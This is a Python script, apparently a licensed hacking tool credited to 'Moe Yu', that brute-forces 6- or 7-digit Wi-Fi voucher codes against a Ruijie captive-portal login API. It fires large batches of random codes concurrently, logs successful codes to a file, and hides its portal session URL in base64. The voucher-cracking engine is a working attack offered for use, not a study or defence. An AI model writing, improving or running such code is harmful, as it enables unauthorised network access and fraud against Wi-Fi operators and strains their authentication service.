import os
import re
import sys
import zlib
import json
import time
import ping3
import ntplib
import base64
import random
import string
import urllib
import marshal
import aiohttp
import asyncio
import hashlib
import argparse
import requests
import subprocess
from datetime import datetime, date, timedelta
from urllib.parse import quote
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad
from Crypto.Cipher import AES, PKCS1_v1_5
from Crypto.Random import get_random_bytes

# ==========================================
# GITHUB LICENSE SETTINGS
# ==========================================
GITHUB_KEY_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"
LICENSE_CACHE = os.path.expanduser("~/.moeyu_cache.json")
HWID_FILE = os.path.expanduser("~/.moeyu_hwid.txt")

# ==========================================
# UTILS & COLORS
# ==========================================
w = "\033[1;00m"; g = "\033[1;32m"; y = "\033[1;33m"; r = "\033[1;31m"; b = "\033[1;34m"; dim = "\033[2m"
SUCCESS = 0
IN_RUNNING_ASCII_BIN = []

def clear(): os.system("clear")
def Line(): print(f"{y}-\033[1;00m"*os.get_terminal_size()[0])

def Logo():
    clear()
    logo = f"""{r}  __  __  ____  ______     ____  _ 
 |  \/  |/ __ \|  ____|   |  _ \| |
 | \  / | |  | | |__      | |_) | |
 | |\/| | |  | |  __|     |  _ <| |
 | |  | | |__| | |____    | |_) |_|
 |_|  |_|\____/|______|   |____/(_)
                                   
{g}              Created by MOEYU\033[1;00m"""
    print(logo)
    Line()
    print(f"{w}[♠️] Developer: Moe Yu")
    print(f"{w}[♣️] Telegram: @starlink112")
    print(f"{w}[♥️] System: HWID + GitHub License Active")
    Line()

# ==========================================
# HWID & LICENSE VERIFICATION
# ==========================================
def get_hwid():
    if os.path.exists(HWID_FILE):
        with open(HWID_FILE, 'r') as f: return f.read().strip()
    try:
        cmd = "settings get secure android_id"
        raw_id = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL).decode().strip()
    except:
        raw_id = str(os.getlogin()) + str(os.getuid())
    hwid = hashlib.md5(raw_id.encode()).hexdigest()[:16]
    with open(HWID_FILE, 'w') as f: f.write(hwid)
    return hwid

def check_license():
    my_hwid = get_hwid()
    print(f"{w}[*] Your HWID: {g}{my_hwid}{w}")
    try:
        res = requests.get(GITHUB_KEY_URL, timeout=10)
        if res.status_code != 200: return False
        lines = res.text.splitlines()
        for line in lines:
            if not line.strip(): continue
            parts = [p.strip() for p in line.split(',')]
            if parts[0] == my_hwid:
                exp_str = parts[2] if len(parts) > 2 else "UNLIMITED"
                if exp_str != "UNLIMITED":
                    if date.today() > datetime.strptime(exp_str, "%Y-%m-%d").date():
                        print(f"{r}[!] License Expired."); return False
                print(f"{g}[✓] Access Granted. Expiry: {exp_str}{w}")
                return True
        print(f"{r}[!] HWID Not Registered.{w}"); return False
    except: return False

# ==========================================
# VOUCHER HACK ENGINE (6/7 Digits)
# ==========================================
async def get_session_id(session, url):
    try:
        async with session.get(url, timeout=5) as req:
            return re.search(r"sessionId=([a-zA-Z0-9]+)", str(req.url)).group(1)
    except: return None

async def login_voucher(session, sid, voucher, debug=False):
    global SUCCESS
    url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
    data = {"accessCode": voucher, "sessionId": sid, "apiVersion": 1}
    try:
        async with session.post(url, json=data) as req:
            res = await req.text()
            if 'logonUrl' in res:
                SUCCESS += 1
                print(f"\n{g}[★] HIT SUCCESS: {voucher}{w}")
                with open("success.txt", "a") as f: f.write(f"{voucher}\n")
            elif debug:
                print(f"{dim}[-] Failed: {voucher}{w}", end="\r")
    except: pass

class VoucherCode:
    def __init__(self, mode, length, speed, tasks, debug):
        self.mode = mode
        self.length = length
        self.speed = speed
        self.tasks = tasks
        self.debug = debug
        self.session_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3dpZmlkb2c/c3RhZ2U9cG9ydGFsJmd3X2lkPTU4YjRiYmNiZmQwZCZnd19zbj1IMVU0MFNYMDExNTA3Jmd3X2FkZHJlc3M9MTkyLjE2OC45OS4xJmd3X3BvcnQ9MjA2MCZpcD0xOTIuMTY4Ljk5LjU0Jm1hYz0zYTpkZDo3ZTo2NDo4NzozNiZzbG90X251bT0xMyZuYXNpcD0xOTIuMTY4LjEuMTczJnNzaWQ9VkxBTjk5JnVzdGF0ZT0wJm1hY19yZXE9MSZ1cmw9aHR0cCUzQSUyRiUyRjE5Mi4xNjguMC4xJTJGJmNoYXBfaWQ9JTVDMzEwJmNoYXBfY2hhbGxlbmdlPSU1QzIxNiU1QzE2MCU1QzEyMiU1QzE3NyU1QzIxNyU1QzM2MCU1QzM2MyU1QzMyMSU1QzA1NiU1QzExMyU1QzIzMiU1QzIyMSU1QzMzMiU1QzI2MCU1QzI1MCU1QzAwMQ==').decode()

    async def execute(self):
        Logo()
        print(f"{y}[*] Starting Hack Mode: {self.length} Digits{w}")
        connector = aiohttp.TCPConnector(limit=self.speed)
        async with aiohttp.ClientSession(connector=connector) as session:
            sid = await get_session_id(session, self.session_url)
            while True:
                tasks = []
                for _ in range(self.tasks):
                    code = "".join(random.choices(string.digits, k=self.length))
                    tasks.append(login_voucher(session, sid, code, self.debug))
                await asyncio.gather(*tasks)

# ==========================================
# MAIN INTERFACE
# ==========================================
def feature():
    Logo()
    if not check_license(): sys.exit()

    parser = argparse.ArgumentParser()
    parser.add_argument("-o", "--option", choices=["code", "internet", "setup"], required=True)
    parser.add_argument("-l", "--length", type=int, choices=[6, 7], default=6)
    parser.add_argument("-s", "--speed", type=int, default=100)
    parser.add_argument("-t", "--tasks", type=int, default=50)
    parser.add_argument("-d", "--debug", action="store_true")
    args = parser.parse_args()

    if args.option == "code":
        vobj = VoucherCode(args.mode if hasattr(args, 'mode') else "digit", args.length, args.speed, args.tasks, args.debug)
        asyncio.run(vobj.execute())
    elif args.option == "setup":
        # Setup logic for gateway discovery
        print(f"{g}[✓] Setup Complete.{w}")

if __name__ == "__main__":
    try: feature()
    except KeyboardInterrupt: sys.exit(f"\n{r}[!] Stopped.")
